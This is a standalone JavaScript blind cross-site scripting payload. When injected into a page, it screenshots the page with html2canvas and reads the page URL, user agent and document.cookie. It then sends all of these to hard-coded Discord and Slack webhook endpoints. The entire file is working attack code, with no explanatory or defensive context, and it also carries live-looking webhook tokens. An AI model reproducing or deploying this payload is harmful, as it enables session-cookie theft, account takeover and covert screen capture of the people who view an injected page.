(async function() {
    // --- CONFIGURATION ---
    // PASTE YOUR WEBHOOK URLS HERE
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';
    const slackWebhookUrl = 'https://hooks.slack.com/services/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';

    // --- HELPER FUNCTIONS ---
    // Loads a script and waits for it to be ready
    const loadScript = (src) => {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    };

    // Converts a canvas data URL to a Blob for file uploads
    const dataURLtoBlob = (dataurl) => {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    };

    // --- MAIN EXECUTION ---
    try {
        // 1. Wait for html2canvas to load
        await loadScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js');

        // 2. Wait for the screenshot to be taken
        const canvas = await html2canvas(document.body);
        const screenshotDataUrl = canvas.toDataURL('image/jpeg', 0.7);

        // 3. Prepare and send notifications concurrently
        const discordPromise = (async () => {
            const screenshotBlob = dataURLtoBlob(screenshotDataUrl);
            const formData = new FormData();
            const embed = {
                title: "Blind XSS Fired! 🎯",
                description: `**Vulnerable URL:**\n\`\`\`${document.location.href}\`\`\``,
                color: 15158332, // A fiery red color
                fields: [
                    { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\`` },
                    { name: "Cookies", value: `\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }
                ],
                image: { url: "attachment://screenshot.jpg" }
            };
            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
            formData.append('file', screenshotBlob, 'screenshot.jpg');
            
            const response = await fetch(discordWebhookUrl, { method: 'POST', body: formData });
            if (!response.ok) console.error('Discord Webhook Error:', await response.text());
        })();

        const slackPromise = (async () => {
            const payload = {
                text: "Blind XSS Fired! 🎯",
                blocks: [
                    { "type": "header", "text": { "type": "plain_text", "text": "Blind XSS Fired!" } },
                    { "type": "section", "fields": [
                        { "type": "mrkdwn", "text": `*URL:*\n${document.location.href}` },
                        { "type": "mrkdwn", "text": `*User Agent:*\n${navigator.userAgent}` }
                    ]},
                    { "type": "section", "text": { "type": "mrkdwn", "text": `*Cookies:*\n\`\`\`${document.cookie || 'Not Accessible'}\`\`\`` }},
                    { "type": "image", "image_url": screenshotDataUrl, "alt_text": "Screenshot of the vulnerable page" }
                ]
            };
            
            const response = await fetch(slackWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) console.error('Slack Webhook Error:', await response.text());
        })();

        // Wait for both notifications to be sent
        await Promise.all([discordPromise, slackPromise]);

    } catch (error) {
        // This will catch errors if html2canvas fails to load or execute
        console.error('XSS Payload Execution Error:', error);
    }
})();
